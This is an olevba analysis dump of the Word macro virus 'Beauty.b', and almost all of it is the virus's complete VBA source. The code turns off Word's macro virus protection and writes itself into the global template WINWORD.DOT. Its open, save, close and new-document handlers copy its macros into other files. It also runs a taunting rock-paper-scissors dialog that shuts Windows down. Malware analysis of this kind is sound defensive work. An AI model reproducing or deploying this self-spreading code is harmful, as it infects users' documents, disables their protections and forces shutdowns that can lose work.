olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Beauty.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Beauty.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileTemplates.bas 
in file: Virus.MSWord.Beauty.b - OLE stream: 'Macros/VBA/FileTemplates'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "更改使用中範本和範本選項"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileTemplates.MAIN"
Dim k
Dim y
'1997.09.02 by gdh
k = WordBasic.Int(Rnd() * 10)
If k >= 5 Then
WordBasic.Call "game"
GoTo bye
End If

exit_:
WordBasic.Beep
WordBasic.MsgBox " 記 憶 體 用 完 ", "WordBasic Err = 7", 48

bye:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ToolsMacro.bas 
in file: Virus.MSWord.Beauty.b - OLE stream: 'Macros/VBA/ToolsMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "執行,建立,刪除或修訂巨集"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
Dim k
Dim y
'1997.09.02 by gdh
k = WordBasic.Int(Rnd() * 10)
If k >= 5 Then
WordBasic.Call "game"
GoTo bye
End If

exit_:
WordBasic.Beep
WordBasic.MsgBox " 記 憶 體 用 完 ", "WordBasic Err = 7", 48

bye:

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Beauty.b - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "儲存文件複本於另一檔案"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim fn$
Dim s$
Dim cm1
Dim j
Dim tt
'1997.09.02 by gdh
WordBasic.DisableInput 1
On Error GoTo -1: On Error GoTo exit_
Err.Number = 0
fn$ = WordBasic.[FileName$]()
s$ = WordBasic.[DefaultDir$](8) + "\WINWORD.DOT"

WordBasic.FileSaveAs Format:=1
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="BG", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="AutoOpen", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="FileNew", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="FileOpen", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="FileClose", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="Game", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="ToolsMacro", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="FileSaveAs", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="FileTemplates", Tab:=3

WordBasic.DocClose 1

exit_:

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: Virus.MSWord.Beauty.b - OLE stream: 'Macros/VBA/FileClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = " "
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileClose.MAIN"
Dim fn$
Dim s$
Dim cm1
Dim j
Dim tt
'1997.09.02 by gdh
WordBasic.DisableInput 1
On Error Resume Next
Err.Number = 0
fn$ = WordBasic.[FileName$]()
s$ = WordBasic.[DefaultDir$](8) + "\WINWORD.DOT"

WordBasic.FileSaveAs Format:=1
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="BG", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="AutoOpen", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="FileNew", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="FileOpen", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="FileClose", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="Game", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="ToolsMacro", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="FileSaveAs", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="FileTemplates", Tab:=3

WordBasic.DocClose 1

exit_:


End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Beauty.b - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim s$
Dim fn$
Dim cm1
Dim j
Dim tt
'1997.09.02 by gdh
On Error Resume Next
Err.Number = 0
s$ = WordBasic.[DefaultDir$](8) + "\WINWORD.DOT"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen dlg
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
fn$ = dlg.Name

WordBasic.FileSaveAs Format:=1
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="BG", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="AutoOpen", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="FileNew", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="FileOpen", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="FileClose", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="Game", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="ToolsMacro", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="FileSaveAs", Tab:=3
WordBasic.Organizer Copy:=1, Source:=s$, Destination:=fn$, Name:="FileTemplates", Tab:=3

WordBasic.DocClose 1


exit_:


End Sub
-------------------------------------------------------------------------------
VBA MACRO GAME.bas 
in file: Virus.MSWord.Beauty.b - OLE stream: 'Macros/VBA/GAME'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim R
Dim num
Dim ans
'1997.09.02 by gdh
R = 1
WordBasic.BeginDialog 478, 216, " 美 女 拳 "
    WordBasic.Picture 10, 6, 238, 199, "p4", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "嗨 ! 辛 苦 了 ! 和 我 猜 個 拳", "Text1"
    WordBasic.Text 266, 27, 193, 13, "輕 鬆 一 下 吧 !  猜 贏 就 讓 ", "Text2"
    WordBasic.Text 266, 46, 184, 13, "你 看 精 彩 的 !! 猜 輸 了 !!", "Text3"
    WordBasic.Text 266, 65, 190, 13, "放 心 !! 絕 不 會 動 你 寶 貴", "Text4"
    WordBasic.Text 266, 84, 190, 13, "的 電 腦 和 資 料 的 !! 放 心", "Text5"
    WordBasic.Text 266, 103, 190, 13, "玩 吧 !小 心 別 噴 鼻 血 喔 !", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "那我出剪刀好了!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "那我出石頭好了!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "那我出布好了!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = WordBasic.CurValues.UserDialog
num = WordBasic.Int(Rnd() * 5) + 1
ans = WordBasic.Dialog.UserDialog(gdh)
If num >= 4 Then
recall
GoTo guessgame

End If
If ans = num Then
WordBasic.MsgBox " 可  惡 !! 竟  然  會  輸  給  你 !!", " 美 女 拳 ", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox " 遜  斃  了 !! 叫  聲  姑  奶  奶 , 考  慮  讓  你  一  把 !!", " 美 女 拳 ", 64
R = R + 1
If R <= 5 Then
GoTo guessgame
End If

WordBasic.MsgBox " 沒  見  過  像  你  這  樣  笨  的  人  !!  小  姐  我  不  跟  你  耗  了 !!", " 美 女 拳 ", 64
WordBasic.ExitWindows

exit_:
guess1
End Sub

Private Sub guess1()
Dim R
Dim num
Dim ans
R = 1
WordBasic.BeginDialog 478, 216, " 美 女 拳 "
    WordBasic.Picture 10, 6, 238, 199, "lamo", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "嗯!你贏了!再和我猜個拳吧!", "Text1"
    WordBasic.Text 266, 27, 193, 13, "看你好運到幾時?猜贏了!", "Text2"
    WordBasic.Text 266, 46, 184, 13, "就讓你看更精彩的!!猜輸了!!", "Text3"
    WordBasic.Text 266, 65, 190, 13, "放心!!絕不會傷害你寶貴", "Text4"
    WordBasic.Text 266, 84, 190, 13, "的電腦和資料的!!放心", "Text5"
    WordBasic.Text 266, 103, 190, 13, "玩吧!記得把鼻血擦乾淨喔!", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "那我出剪刀好了!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "那我出石頭好了!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "那我出布好了!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = WordBasic.CurValues.UserDialog
num = WordBasic.Int(Rnd() * 5) + 1
ans = WordBasic.Dialog.UserDialog(gdh)
If num >= 5 Then
recall
GoTo guessgame

End If

If ans = num Then
WordBasic.MsgBox " 氣  死  人  了 !! 你  的  運  氣  怎  麼  這  麼  好  ?", " 美 女 拳 ", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox " 回  去  吃  奶  吧 !! 乳  臭  未  乾  的  小  子 !!", " 美 女 拳 ", 64
R = R + 1
If R <= 5 Then
GoTo guessgame
End If

WordBasic.MsgBox " 天  字  第  一  號  大  白  癡 !!!! 過  來  舔  我  的  腳  趾  頭  吧 !!", " 美 女 拳 ", 64
WordBasic.ExitWindows


exit_:
guess2
End Sub

Private Sub guess2()
Dim R
Dim num
Dim ans
R = 1
WordBasic.BeginDialog 478, 216, " 美 女 拳 "
    WordBasic.Picture 10, 6, 238, 199, "p1", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "不簡單!連闖兩關!這回要讓你", "Text1"
    WordBasic.Text 266, 27, 193, 13, "吃不完兜著走!你行嗎???", "Text2"
    WordBasic.Text 266, 46, 184, 13, "你贏的話!還有更精彩的", "Text3"
    WordBasic.Text 266, 65, 190, 13, "揉揉眼睛別瞪著一對死魚眼!", "Text4"
    WordBasic.Text 266, 84, 190, 13, "把掛在嘴角的口水擦乾吧!!", "Text5"
    WordBasic.Text 266, 103, 190, 13, "別裝出一副大白癡的模樣!", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "那我出剪刀好了!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "那我出石頭好了!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "那我出布好了!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = WordBasic.CurValues.UserDialog
num = WordBasic.Int(Rnd() * 15) + 1
ans = WordBasic.Dialog.UserDialog(gdh)
If num >= 8 Then
recall
GoTo guessgame

End If

If ans = num Then
WordBasic.MsgBox "喂 !! 你  有  作  弊  的  嫌  疑  喔 !!", " 美 女 拳 ", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox "喂 !! 你  在  睡  覺  ㄚ ????", " 美 女 拳 ", 64
R = R + 1
If R <= 5 Then
GoTo guessgame
End If

WordBasic.MsgBox " 癩  蝦  蟆  想  吃  天  鵝  肉  !! 還  早  著  呢  !! 一  邊  涼  快  去 !!", " 美 女 拳 ", 64
WordBasic.ExitWindows

exit_:
guess3
End Sub

Private Sub guess3()
Dim num
Dim ans
WordBasic.BeginDialog 478, 216, " 美 女 拳 "
    WordBasic.Picture 10, 6, 238, 199, "p2", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "嗨!一路過關斬將!辛苦了! ", "Text1"
    WordBasic.Text 266, 27, 193, 13, "輕鬆一下!", "Text2"
    WordBasic.Text 266, 46, 184, 13, "準備看精彩的吧!!", "Text3"
    WordBasic.Text 266, 65, 190, 13, "放心!!絕不會動你寶貴", "Text4"
    WordBasic.Text 266, 84, 190, 13, "的電腦和資料的!!放心看吧!", "Text5"
    WordBasic.Text 266, 103, 190, 13, "小心別把鼻血噴得到處都是!", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "那我出剪刀好了!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "那我出石頭好了!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "那我出布好了!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = WordBasic.CurValues.UserDialog
num = WordBasic.Int(Rnd() * 10) + 1
ans = WordBasic.Dialog.UserDialog(gdh)
If num >= 6 Then
recall
GoTo guessgame

End If

If ans = num Then
WordBasic.MsgBox " 討  厭  啦  !! 剛  才  那  一  拳  不  算  啦  !!", " 美 女 拳 ", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox " ㄟ !! 我  贏  了 !! 好  棒  喔  !! 這  叫  實  力  !! 懂  不  懂  ??", " 美 女 拳", 64
GoTo guessgame



exit_:
WordBasic.FileNewDefault
WordBasic.CenterPara
WordBasic.FormatFont Points:=64, Underline:=1, Color:=6, Bold:=1
WordBasic.Insert "我發現一 隻大豬哥了耶 !! 在哪裡....?在哪裡.......? 不就正在電腦螢幕前嗎??"
WordBasic.DocClose 1
WordBasic.ExitWindows

End Sub

Private Sub recall()
 
WordBasic.MsgBox " 搞  什  麼  嘛 ! 竟  然  平  手 ! 再  猜  一  拳  吧 !! ", " 美 女 拳 ", 64


End Sub
-------------------------------------------------------------------------------
VBA MACRO FileNew.bas 
in file: Virus.MSWord.Beauty.b - OLE stream: 'Macros/VBA/FileNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim t
Dim a$
Dim s$
'1997.09.02 by gdh
On Error Resume Next
t = WordBasic.Second(WordBasic.Now())
a$ = WordBasic.[Right$](Str(t), 1)
s$ = WordBasic.[DefaultDir$](8) + "\WINWORD.DOT"
WordBasic.FileNew Template:=s$, NewTemplate:=1
WordBasic.FileSaveAs Format:=1, Name:="DOC" + a$ + ".doc"
If WordBasic.Day(WordBasic.Now()) <= WordBasic.Int(Rnd() * 30) + 1 Then
WordBasic.Call "game"
End If
exit_:

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Beauty.b - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
'1997.09.02 by gdh
On Error Resume Next
Err.Number = 0
Options.VirusProtection = False
WordBasic.Call "BG"
End Sub
-------------------------------------------------------------------------------
VBA MACRO BG.bas 
in file: Virus.MSWord.Beauty.b - OLE stream: 'Macros/VBA/BG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()

Dim fn$
Dim s$
Dim cm
Dim i
Dim t
'1997.09.02 by gdh
Options.VirusProtection = False
WordBasic.DisableInput 1
On Error GoTo -1: On Error GoTo exit_
fn$ = WordBasic.[FileName$]()
s$ = WordBasic.[DefaultDir$](8) + "\WINWORD.DOT"
cm = WordBasic.CountMacros(0, 0, 1)
If cm > 0 Then
   For i = 1 To cm
      If WordBasic.[MacroName$](i, 0, 0, 1) = "BG" Then t = 1
   Next i
End If
If t <> 1 Then
WordBasic.FileSaveAs Name:=s$, Format:=1
On Error Resume Next
Err.Number = 0
WordBasic.DocClose 1
WordBasic.FileExit 1
End If

exit_:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

